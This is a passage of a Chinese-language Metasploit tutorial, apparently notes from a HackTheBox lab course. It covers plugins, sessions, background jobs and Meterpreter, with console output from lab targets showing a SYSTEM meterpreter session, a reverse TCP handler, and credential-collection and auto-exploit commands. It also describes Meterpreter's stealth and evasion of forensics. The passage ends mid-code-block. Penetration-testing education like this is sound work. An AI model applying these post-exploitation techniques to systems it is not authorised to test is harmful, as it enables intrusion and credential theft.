id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h3><p>要开始使用插件，我们需要确保它安装在我们机器上的正确目录中。导航到<code>/usr/share/metasploit-framework/plugins</code>，这是每个新安装的默认目录<code>msfconsole</code>，应该向我们展示我们有哪些可用的插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins</span><br><span class="line"></span><br><span class="line">aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb</span><br><span class="line">alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb</span><br><span class="line">auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb</span><br></pre></td></tr></table></figure><p>如果在此处找到该插件，我们可以在内部启动它<code>msfconsole</code>，然后会看到该特定插件的问候输出，表明它已成功加载并可以使用了：</p><h3 id="MSF-加载-Nessus"><a href="#MSF-加载-Nessus" class="headerlink" title="MSF - 加载 Nessus"></a>MSF - 加载 Nessus</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; load nessus</span><br><span class="line"></span><br><span class="line">[*] Nessus Bridge for Metasploit</span><br><span class="line">[*] Type nessus_help for a command listing</span><br><span class="line">[*] Successfully loaded Plugin: Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; nessus_help</span><br><span class="line"></span><br><span class="line">Command                     Help Text</span><br><span class="line">-------                     ---------</span><br><span class="line">Generic Commands            </span><br><span class="line">-----------------           -----------------</span><br><span class="line">nessus_connect              Connect to a Nessus server</span><br><span class="line">nessus_logout               Logout from the Nessus server</span><br><span class="line">nessus_login                Login into the connected Nessus server with a different username and </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">nessus_user_del             Delete a Nessus User</span><br><span class="line">nessus_user_passwd          Change Nessus Users Password</span><br><span class="line">                            </span><br><span class="line">Policy Commands             </span><br><span class="line">-----------------           -----------------</span><br><span class="line">nessus_policy_list          List all polciies</span><br><span class="line">nessus_policy_del           Delete a policy</span><br></pre></td></tr></table></figure><p>如果插件安装不正确，我们将在尝试加载时收到以下错误。</p><p> MSF - 加载 Nessus</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; load Plugin_That_Does_Not_Exist</span><br><span class="line"></span><br><span class="line">[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb</span><br></pre></td></tr></table></figure><p>要开始使用该插件，请开始在该特定插件的帮助菜单中发出我们可用的命令。每个跨平台集成都为我们提供了一组独特的交互，我们可以在评估期间使用这些交互，因此在使用它们之前仔细阅读每一个交互是很有帮助的，这样可以最大限度地利用它们。</p><h3 id="安装新插件"><a href="#安装新插件" class="headerlink" title="安装新插件"></a>安装新插件</h3><p>Parrot OS 发行版的每次更新都会安装新的、更受欢迎的插件，因为它们由其制造商向公众推出，收集在 Parrot 更新存储库中。<code>/usr/share/metasploit-framework/plugins</code>要安装未包含在发行版新更新中的新自定义插件，我们可以获取制造商页面上提供的 .rb 文件，并将其放置在具有适当权限的文件夹中。</p><p>例如，让我们尝试安装<a href="https://github.com/darkoperator/Metasploit-Plugins.git">DarkOperator 的 Metasploit-Plugins</a>。然后，按照上面的链接，我们得到几个 Ruby ( <code>.rb</code>) 文件，我们可以直接将它们放在上面提到的文件夹中。</p><h3 id="下载-MSF-插件"><a href="#下载-MSF-插件" class="headerlink" title="下载 MSF 插件"></a>下载 MSF 插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins</span><br><span class="line">vnswer77@htb[/htb]$ ls Metasploit-Plugins</span><br><span class="line"></span><br><span class="line">aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb</span><br><span class="line">alias.rb           komand.rb      pentest.rb           thread.rb</span><br><span class="line">auto_add_route.rb  lab.rb         request.rb           token_adduser.rb</span><br><span class="line">beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb</span><br><span class="line">db_credcollect.rb  msfd.rb        sample.rb            twitt.rb</span><br><span class="line">db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb</span><br><span class="line">event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb</span><br><span class="line">ffautoregen.rb     nexpose.rb     socket_logger.rb</span><br><span class="line">growl.rb           openvas.rb     sounds.rb</span><br></pre></td></tr></table></figure><p>这里我们可以以插件<code>pentest.rb</code>为例，复制到<code>/usr/share/metasploit-framework/plugins</code>.</p><h4 id="MSF-将插件复制到-MSF"><a href="#MSF-将插件复制到-MSF" class="headerlink" title="MSF - 将插件复制到 MSF"></a>MSF - 将插件复制到 MSF</h4><p> MSF - 将插件复制到 MSF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb</span><br></pre></td></tr></table></figure><p>然后，<code>msfconsole</code>通过运行命令启动并检查插件的安装<code>load</code>。加载插件后， at<code>help menu</code>会<code>msfconsole</code>自动扩展附加功能。</p><h4 id="MSF-加载插件"><a href="#MSF-加载插件" class="headerlink" title="MSF - 加载插件"></a>MSF - 加载插件</h4><p> MSF - 加载插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; load pentest</span><br><span class="line"></span><br><span class="line">       ___         _          _     ___ _           _</span><br><span class="line">      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _</span><br><span class="line">      |  _/ -_) &#x27; \  _/ -_|_-&lt;  _| |  _/ | || / _` | | &#x27; \ </span><br><span class="line">      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|</span><br><span class="line">                                              |___/</span><br><span class="line">      </span><br><span class="line">Version 1.6</span><br><span class="line">Pentest Plugin loaded.</span><br><span class="line">by Carlos Perez (carlos_perez[at]darkoperator.com)</span><br><span class="line">[*] Successfully loaded plugin: pentest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; help</span><br><span class="line"></span><br><span class="line">Tradecraft Commands</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">    Command          Description</span><br><span class="line">    -------          -----------</span><br><span class="line">    check_footprint  Checks the possible footprint of a post module on a target system.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_exploit Commands</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    show_client_side  Show matched client side exploits from data imported from vuln scanners.</span><br><span class="line">    vuln_exploit      Runs exploits based on data imported from vuln scanners.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Discovery Commands</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Command                 Description</span><br><span class="line">    -------                 -----------</span><br><span class="line">    discover_db             Run discovery modules against current hosts in the database.</span><br><span class="line">    network_discover        Performs a port-scan and enumeration of services found for non pivot networks.</span><br><span class="line">    pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.</span><br><span class="line">    show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Project Commands</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    project       Command for managing projects.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Postauto Commands</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Command             Description</span><br><span class="line">    -------             -----------</span><br><span class="line">    app_creds           Run application password collection modules against specified sessions.</span><br><span class="line">    get_lhost           List local IP addresses that can be used for LHOST.</span><br><span class="line">    multi_cmd           Run shell command against several sessions</span><br><span class="line">    multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.</span><br><span class="line">    multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.</span><br><span class="line">    multi_post          Run a post module against specified sessions.</span><br><span class="line">    multi_post_rc       Run resource file with post modules and options against specified sessions.</span><br><span class="line">    sys_creds           Run system password collection modules against specified sessions.</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>许多人为 Metasploit 框架编写了许多不同的插件。它们都有特定的目的，在熟悉它们之后可以极大地帮助我们节省时间。查看下面的流行插件列表：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href="https://nmap.org/">nMap（预装）</a></td><td><a href="https://sectools.org/tool/nexpose/">NexPose（预装）</a></td><td><a href="https://www.tenable.com/products/nessus">Nessus（预装）</a></td></tr><tr><td><a href="http://blog.gentilkiwi.com/mimikatz">Mimikatz（预装 V.1）</a></td><td><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi">Stdapi（预装）</a></td><td><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation">电磁炮</a></td></tr><tr><td><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb">私人</a></td><td><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/">隐身（预装）</a></td><td><a href="https://github.com/darkoperator/Metasploit-Plugins">黑暗操作员的</a></td></tr></tbody></table><h3 id="混入"><a href="#混入" class="headerlink" title="混入"></a>混入</h3><p>Metasploit 框架是用面向对象的编程语言 Ruby 编写的。<code>msfconsole</code>这在使用起来非常出色方面起着重要作用。Mixin 是其中一种特性，在实现时，它可以为脚本的创建者和用户提供很大的灵活性。</p><p>Mixin 是充当其他类使用的方法的类，而不必是其他类的父类。因此，将其称为继承而不是包含被认为是不合适的。它们主要用于我们：</p><ol><li>想为一个类提供很多可选的功能。</li><li>想要为多个类使用一个特定的功能。</li></ol><p>大多数 Ruby 编程语言都围绕作为模块的 Mixins 展开。Mixins 的概念是使用 word 实现的<code>include</code>，我们将模块名称作为<code>parameter</code>. <a href="https://en.wikibooks.org/wiki/Metasploit/UsingMixins">我们可以在这里</a>阅读更多关于 mixin 的信息。</p><p>如果我们刚刚开始使用 Metasploit，我们不应该担心 Mixins 的使用或它们对我们评估的影响。然而，这里提到它们是为了说明 Metasploit 的定制会变得多么复杂。</p><h2 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h2><p>MSFconsole 可以同时管理多个模块。这是它为用户提供如此多灵活性的众多原因之一。这是通过使用 来完成的<code>Sessions</code>，它为您部署的所有模块创建专用的控制接口。</p><p>一旦创建了多个会话，我们就可以在它们之间切换并将不同的模块链接到其中一个后台会话以在其上运行或将它们转换为作业。请注意，一旦将会话置于后台，它将继续运行，并且我们与目标主机的连接将持续存在。但是，如果在有效负载运行时出现问题，会话可能会终止，从而导致通信通道中断。</p><h2 id="使用会话"><a href="#使用会话" class="headerlink" title="使用会话"></a>使用会话</h2><p>在 msfconsole 中运行任何可用的漏洞利用或辅助模块时，只要它们形成与目标主机的通信通道，我们就可以将会话置于后台。这可以通过按组合键或在 Meterpreter stages 的情况下<code>[CTRL] + [Z]</code>键入命令来完成。<code>background</code>这将提示我们一条确认消息。接受提示后，我们将返回到 msfconsole 提示符 ( <code>msf6 &gt;</code>) 并立即能够启动不同的模块。</p><h4 id="列出活动会话"><a href="#列出活动会话" class="headerlink" title="列出活动会话"></a>列出活动会话</h4><p>我们可以使用该<code>sessions</code>命令来查看我们当前活动的会话。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec_psh) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501 (10.10.10.205)</span><br></pre></td></tr></table></figure><h4 id="与会话交互"><a href="#与会话交互" class="headerlink" title="与会话交互"></a>与会话交互</h4><p>您可以使用该<code>sessions -i [no.]</code>命令打开特定会话。</p><p> 与会话交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>当我们想在一个已经被利用的系统上运行一个额外的模块时，这特别有用，该系统具有形成的、稳定的通信通道。</p><p>这可以通过后台处理我们当前的会话来完成，该会话是由于第一个漏洞利用的成功而形成的，搜索我们希望运行的第二个模块，并且，如果所选模块的类型可能，选择会话号该模块应该运行。这可以从第二个模块的菜单中完成<code>show options</code>。</p><p>通常，这些模块可以在类别中找到<code>post</code>，指的是 Post-Exploitation 模块。此类别中的主要模块原型包括凭据收集器、本地漏洞利用建议器和内部网络扫描器。</p><hr><h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><p>例如，如果我们在特定端口下运行主动攻击并且需要此端口用于不同的模块，我们不能简单地使用终止会话<code>[CTRL] + [C]</code>。如果我们这样做，我们会看到该端口仍在使用中，影响我们对新模块的使用。因此，我们需要使用<code>jobs</code>命令来查看当前在后台运行的活动任务并终止旧任务以释放端口。</p><p>会话中的其他类型的任务也可以转换为作业以在后台无缝运行，即使会话终止或消失也是如此。</p><h4 id="查看作业命令帮助菜单"><a href="#查看作业命令帮助菜单" class="headerlink" title="查看作业命令帮助菜单"></a>查看作业命令帮助菜单</h4><p>我们可以通过键入 来查看此命令的帮助菜单，就像其他命令一样<code>jobs -h</code>。</p><p> 查看作业命令帮助菜单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; jobs -h</span><br><span class="line">Usage: jobs [options]</span><br><span class="line"></span><br><span class="line">Active job manipulation and interaction.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -K        Terminate all running jobs.</span><br><span class="line">    -P        Persist all running jobs on restart.</span><br><span class="line">    -S &lt;opt&gt;  Row search filter.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -i &lt;opt&gt;  Lists detailed information about a running job.</span><br><span class="line">    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.</span><br><span class="line">    -l        List all running jobs.</span><br><span class="line">    -p &lt;opt&gt;  Add persistence to job by job ID</span><br><span class="line">    -v        Print more detailed info.  Use with -i and -l</span><br></pre></td></tr></table></figure><h4 id="查看漏洞利用命令帮助菜单"><a href="#查看漏洞利用命令帮助菜单" class="headerlink" title="查看漏洞利用命令帮助菜单"></a>查看漏洞利用命令帮助菜单</h4><p>当我们运行 exploit 时，我们可以通过键入<code>exploit -j</code>. 根据命令的帮助菜单<code>exploit</code>，添加<code>-j</code>到我们的命令中。而不仅仅是<code>exploit</code>or <code>run</code>，将“在作业的上下文中运行它”。</p><p> 查看漏洞利用命令帮助菜单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit -h</span><br><span class="line">Usage: exploit [options]</span><br><span class="line"></span><br><span class="line">Launches an exploitation attempt.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -J        Force running in the foreground, even if passive.</span><br><span class="line">    -e &lt;opt&gt;  The payload encoder to use.  If none is specified, ENCODER is used.</span><br><span class="line">    -f        Force the exploit to run regardless of the value of MinimumRank.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -j        Run in the context of a job.</span><br><span class="line"></span><br><span class="line">&lt;SNIP</span><br></pre></td></tr></table></figure><h4 id="将漏洞作为后台作业运行"><a href="#将漏洞作为后台作业运行" class="headerlink" title="将漏洞作为后台作业运行"></a>将漏洞作为后台作业运行</h4><p> 将漏洞作为后台作业运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.34:4444</span><br></pre></td></tr></table></figure><h4 id="列出正在运行的作业"><a href="#列出正在运行的作业" class="headerlink" title="列出正在运行的作业"></a>列出正在运行的作业</h4><p>要列出所有正在运行的作业，我们可以使用<code>jobs -l</code>命令。要杀死特定的工作，请查看索引号。作业并使用<code>kill [index no.]</code>命令。使用该<code>jobs -K</code>命令终止所有正在运行的作业。</p><p> 列出正在运行的作业</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; jobs -l</span><br><span class="line"></span><br><span class="line">Jobs</span><br><span class="line">====</span><br><span class="line"></span><br><span class="line"> Id  Name                    Payload                    Payload opts</span><br><span class="line"> --  ----                    -------                    ------------</span><br><span class="line"> 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444</span><br></pre></td></tr></table></figure><p>接下来，我们将使用极其强大的<code>Meterpreter</code>有效负载。</p><h1 id="计价器"><a href="#计价器" class="headerlink" title="计价器"></a>计价器</h1><hr><p>Payload<code>Meterpreter</code>是一种特定类型的多方面、可扩展的 Payload，用于<code>DLL injection</code>确保与受害主机的连接稳定且难以使用简单检查进行检测，并且可以配置为在重启或系统更改时保持不变。此外，Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。</p><p>它被称为渗透测试的瑞士军刀，这是有充分理由的。Meterpreter 的目的是专门改进我们的后开发程序，为我们提供一组精心挑选的相关工具，以便从内部更直接地枚举目标主机。它可以帮助我们找到各种特权升级技术、AV 规避技术、进一步的漏洞研究、提供持久访问、枢轴等。</p><p>对于一些有趣的阅读，请查看这篇关于Meterpreter 无阶段有效载荷的<a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/">文章和这篇关于修改 Metasploit 模板以进行规避的</a><a href="https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion">文章</a>。这些主题超出了本模块的范围，但我们应该意识到这些可能性。</p><hr><h2 id="运行-Meterpreter"><a href="#运行-Meterpreter" class="headerlink" title="运行 Meterpreter"></a>运行 Meterpreter</h2><p>要运行 Meterpreter，我们只需要从输出中选择它的任何版本<code>show payloads</code>，同时考虑到我们正在攻击的连接类型和操作系统。</p><p>漏洞利用完成后，会发生以下事件：</p><ul><li>目标执行初始阶段。这通常是 bind、reverse、findtag、passivex 等。</li><li>stager 加载以 Reflective 为前缀的 DLL。反射存根处理 DLL 的加载&#x2F;注入。</li><li>Meterpreter 核心初始化，通过套接字建立 AES 加密链接，并发送 GET。Metasploit 收到此 GET 并配置客户端。</li><li>最后，Meterpreter 加载扩展。如果模块授予管理权限，它将始终加载<code>stdapi</code>和加载。<code>priv</code>所有这些扩展都是通过 AES 加密加载的。</li></ul><p>每当 Meterpreter Payload 被发送并在目标系统上运行时，我们都会收到一个<code>Meterpreter shell</code>. 然后我们可以立即发出<code>help</code>命令来查看 Meterpreter shell 的功能。</p><h4 id="MSF-Meterpreter-命令-1"><a href="#MSF-Meterpreter-命令-1" class="headerlink" title="MSF - Meterpreter 命令"></a>MSF - Meterpreter 命令</h4><p> MSF - Meterpreter 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pivot                     Manage pivot listeners</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br></pre></td></tr></table></figure><p>其中一些命令也可在模块备忘单中找到以供参考。</p><p>我们需要了解 Meterpreter 的主要思想是，它与在目标操作系统上获得直接 shell 一样好，但具有更多功能。Meterpreter 的开发人员为该项目设定了明确的设计目标，以期在未来的可用性上飙升。Meterpreter 需要：</p><ul><li>隐身</li><li>强大的</li><li>可扩展</li></ul><hr><h2 id="隐身"><a href="#隐身" class="headerlink" title="隐身"></a>隐身</h2><p>Meterpreter 在启动并到达目标后，完全驻留在内存中，不会向磁盘写入任何内容。当 Meterpreter 将自己注入到受感染的进程中时，也不会创建新进程。此外，它可以执行从一个正在运行的进程到另一个运行进程的进程迁移。</p><p>使用现在更新的 msfconsole-v6，目标主机和我们之间的所有 Meterpreter 有效负载通信都使用 AES 加密，以确保数据通信的机密性和完整性。</p><p>所有这些都提供了有限的取证证据，而且对受害机器的影响也很小。</p><hr><h2 id="强大的"><a href="#强大的" class="headerlink" title="强大的"></a>强大的</h2><p>Meterpreter 在目标主机和攻击者之间使用通道化通信系统证明非常有用。当我们通过为它打开一个专用通道立即在我们的 Meterpreter 阶段内生成一个主机操作系统 shell 时，我们可以直接注意到这一点。这也允许使用 AES 加密流量。</p><hr><h2 id="可扩展"><a href="#可扩展" class="headerlink" title="可扩展"></a>可扩展</h2><p>Meterpreter 的功能可以在运行时不断增强并通过网络加载。其模块化结构还允许在不重建的情况下添加新功能。</p><hr><h2 id="使用-Meterpreter"><a href="#使用-Meterpreter" class="headerlink" title="使用 Meterpreter"></a>使用 Meterpreter</h2><p>我们已经在有效载荷部分深入研究了 Meterpreter 的基础知识。现在，我们将了解 Meterpreter shell 的真正优势，以及它如何提高评估的有效性并在交战期间节省时间。我们首先对已知目标运行基本扫描。我们将按单点方式执行此操作，从 msfconsole 内部执行所有操作，以便从对我们目标的数据跟踪中获益。</p><h4 id="MSF-扫描目标"><a href="#MSF-扫描目标" class="headerlink" title="MSF - 扫描目标"></a>MSF - 扫描目标</h4><p> MSF - 扫描目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 